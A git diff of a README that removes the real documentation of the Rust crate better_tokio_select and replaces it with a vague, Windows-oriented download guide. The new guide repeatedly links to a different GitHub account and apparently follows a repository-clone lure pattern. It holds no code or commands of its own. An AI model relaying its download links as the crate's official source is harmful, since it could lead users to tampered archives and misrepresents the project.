@@ -1,152 +1,186 @@
-# `better_tokio_select`
+# 🛠️ better-tokio-select - Format Rust select blocks cleanly
 
-<!-- cargo-reedme: start -->
+[![Download](https://img.shields.io/badge/Download-blue-grey?style=for-the-badge)](https://github.com/energia30-byte/better-tokio-select)
 
-<!-- cargo-reedme: info-start
+## 📥 Download
 
-    Do not edit this region by hand
-    ===============================
+Use this link to visit the page and download the app or source files:
 
-    This region was generated from Rust documentation comments by `cargo-reedme` using this command:
+[Open the download page](https://github.com/energia30-byte/better-tokio-select)
 
-        cargo +nightly reedme
+## 🧰 What this is
 
-    for more info: https://github.com/nik-rev/cargo-reedme
+better-tokio-select is a small Rust tool for code that uses `tokio::select!`.
 
-cargo-reedme: info-end -->
+It helps keep `tokio::select!` blocks in a format that `rustfmt` can handle. That means cleaner code, less manual fixing, and fewer layout issues after formatting.
 
-[![crates.io](https://img.shields.io/crates/v/better_tokio_select?style=flat-square&logo=rust)](https://crates.io/crates/better_tokio_select)
-[![docs.rs](https://img.shields.io/docsrs/better_tokio_select?style=flat-square&logo=docs.rs)](https://docs.rs/better_tokio_select)
-![license](https://img.shields.io/badge/license-Apache--2.0_OR_MIT-blue?style=flat-square)
-![msrv](https://img.shields.io/badge/msrv-1.71-blue?style=flat-square&logo=rust)
-[![github](https://img.shields.io/github/stars/nik-rev/better-tokio-select)](https://github.com/nik-rev/better-tokio-select)
+This tool is useful if you:
+- write Rust on Windows
+- use Tokio for async work
+- want `rustfmt` to keep your `select!` blocks readable
+- want less time spent fixing code layout by hand
 
-This crate exports the macro [`tokio_select!`](https://docs.rs/better_tokio_select/latest/better_tokio_select/macro.tokio_select.html), which, unlike [`tokio::select!`](https://docs.rs/tokio/latest/tokio/macro.select.html), can be formatted by `rustfmt`!
+## 💻 What you need
 
-```toml
-better_tokio_select = "0.2"
-```
+To run this on Windows, you need:
 
-## Syntax
+- Windows 10 or Windows 11
+- an internet connection
+- a web browser
+- enough disk space to store the files
+- Rust installed if you plan to build from source
 
-This macro has all the same capabilities as `tokio::select!`, but the syntax is *slightly* different.
+If you only want to inspect the project, a browser is enough.
 
-`tokio::select!` takes a list of branches:
+## 🚀 Getting started on Windows
 
-```txt
-<pattern> = <async expression> (, if <precondition>)? => <handler>,
-```
+Follow these steps to download and use the project on a Windows PC.
 
-Example:
+1. Open the download page  
+   Go to: https://github.com/energia30-byte/better-tokio-select
 
-```rust
-tokio::select! {
-    Ok(res) = reader.read(&mut buf), if can_read => {
-        writer.write_all(res.bytes)
-    }
-}
-```
+2. Look for the files  
+   On the GitHub page, check the main repository page for the source files and project content.
 
-`tokio_select!` takes a `match ..` expression as an argument, which has a list of arms:
+3. Download the project  
+   Use the GitHub page to download the repository as a ZIP file.  
+   On most browsers, you can do this by opening the green Code button and choosing Download ZIP.
 
-```txt
-.. if let <pattern> = <async expression> (&& <precondition>)? => <handler>,
-```
+4. Save the file  
+   Save it to a place you can find again, such as Downloads or Desktop.
 
-Example:
+5. Extract the ZIP file  
+   Right-click the ZIP file and choose Extract All.
 
-```rust
-tokio_select!(match .. {
-    .. if let Ok(res) = reader.read(&mut buf) && can_read => {
-        writer.write_all(res.bytes)
-    }
-})
-```
+6. Open the folder  
+   Open the extracted folder to view the project files.
 
-For `rustfmt` to work, the argument to a macro must be a valid Rust expression. Hence the odd-looking `..`s.
-Rust compiler expects a pattern in that position, and we provide it with one.
+7. Use the project  
+   If you want to read or build the code, open the files in a Rust editor such as Visual Studio Code.
 
-Admittedly, the syntax is a little strange. But it’s also formattable by `rustfmt`. Trade-offs, people, trade-offs!
+## 🖱️ How to run it
 
-## Examples
+This project is a Rust codebase, so there are two common ways to use it on Windows.
 
-### TCP Proxy with Cancellation and Guard
+### Option 1: View the code
 
-`tokio::select!`:
+If you want to read the project:
+- open the extracted folder
+- look for the Rust source files
+- open them in an editor
 
-```rust
-tokio::select! {
-    res = reader.read(&mut buf), if can_read => {
-        let n = res?;
-        if n == 0 { return Ok(()); }
-        writer.write_all(&buf[..n]).await?;
-    }
+### Option 2: Build the project
 
-    _ = shutdown.recv() => {
-        return Ok(());
-    }
-}
-```
+If you want to build it on your computer:
+- install Rust from the official Rust site
+- open PowerShell or Command Prompt
+- change to the project folder
+- run the Rust build command
 
-`tokio_select!`:
+A common build flow looks like this:
 
-```rust
-tokio_select!(match .. {
-    .. if let Ok(n) = reader.read(&mut buf) && can_read => {
-        let n = res?;
-        if n == 0 { return Ok(()); }
-        writer.write_all(&buf[..n]).await?;
-    }
+1. Open PowerShell
+2. Go to the project folder
+3. Run the build command for the Rust project
+4. Wait for the build to finish
+5. Use the output files that appear in the build folder
 
-    .. if let _ = shutdown.recv() => {
-        return Ok(())
-    }
-})
-```
+## 🧭 Where to find the main files
 
-### Rate-Limited Message Processor
+When you open the project folder, look for:
+- `src/` for source code
+- `Cargo.toml` for project settings
+- `README.md` for project notes
 
-```rust
-tokio::select! {
-    biased;
+These files are common in Rust projects and help you understand how the tool works.
 
-    Some(Message::Data { id, payload }) = rx.recv() => {
-        process(id, payload).await;
-    }
+## 🧱 What it does
 
-    else => {
-        println!("no messages pending");
-        tokio::time::sleep(Duration::from_millis(50)).await;
-    }
-}
-```
+The project focuses on one task: making `tokio::select!` code easier to format with `rustfmt`.
 
-`tokio_select!`:
+That can help with:
+- multiline async blocks
+- readable branch layout
+- less manual spacing work
+- cleaner code reviews
+- fewer format changes after saving files
 
-```rust
-tokio_select!(biased, match .. {
-    .. if let Some(Message::Data { id, payload }) = rx.recv() => {
-        process(id, payload).await;
-    }
+## 🛠️ Basic use cases
 
-    _ => {
-        println!("no messages pending");
-        tokio::time::sleep(Duration::from_millis(50)).await;
-    }
-})
-```
+You may want this project if you:
+- work on async Rust apps
+- use Tokio in a service or desktop tool
+- keep hitting formatting problems in `select!` blocks
+- want code that stays easy to read after formatting
 
-## More examples
+## 🔎 How to check it worked
 
-More examples are available in the documentation of [`tokio_select!`](https://docs.rs/better_tokio_select/latest/better_tokio_select/macro.tokio_select.html).
+After you download or build the project:
+- open the files in an editor
+- find a Rust file that uses `tokio::select!`
+- run formatting if you have Rust tools installed
+- check that the block keeps a neat layout
 
-## Global import
+If the project is built into a tool or library, use it on a sample Rust file first.
 
-You can make the `tokio_select!` macro globally available in your crate, without needing to import it, with:
+## 🪟 Windows tips
 
-```rust
-#[macro_use(tokio_select)]
-extern crate better_tokio_select;
-```
+For the smoothest setup on Windows:
+- keep the project in a folder with a short path, such as `C:\Projects\better-tokio-select`
+- use PowerShell for build commands
+- extract ZIP files before opening the folder in an editor
+- close other apps if your system runs slow during build steps
 
-<!-- cargo-reedme: end -->
+## 🔐 Safety and file check
+
+Before you open any downloaded file:
+- make sure it came from the GitHub link above
+- check that the file name looks correct
+- avoid files from unknown mirrors
+
+## ❓ Common questions
+
+### Is this a full app?
+No. It is a Rust project that helps with `tokio::select!` formatting.
+
+### Do I need coding knowledge?
+Not to download and open the project.  
+To build or use the Rust code, some basic command-line steps help.
+
+### Does it work only on Windows?
+The repo can be used on Windows, and Rust projects often work on other systems too.
+
+### Do I need to install anything first?
+For viewing files, no.  
+For building the project, you need Rust tools on your system.
+
+## 📦 Project layout
+
+A typical layout for a Rust project like this includes:
+- source files in `src`
+- package settings in `Cargo.toml`
+- documentation in `README.md`
+- build output in a target folder after compilation
+
+## 🧪 Example workflow
+
+If you want a simple path on Windows:
+
+1. Open the GitHub page
+2. Download the ZIP file
+3. Extract it
+4. Open the folder in Visual Studio Code
+5. Find the Rust files that use `tokio::select!`
+6. Review how the formatting behaves
+7. Build the project if you want to test it on your own system
+
+## 🧩 Related tools
+
+You may also use:
+- Rust
+- Cargo
+- rustfmt
+- Visual Studio Code
+- PowerShell
+
+These tools fit well with this kind of Rust project and make setup easier on Windows
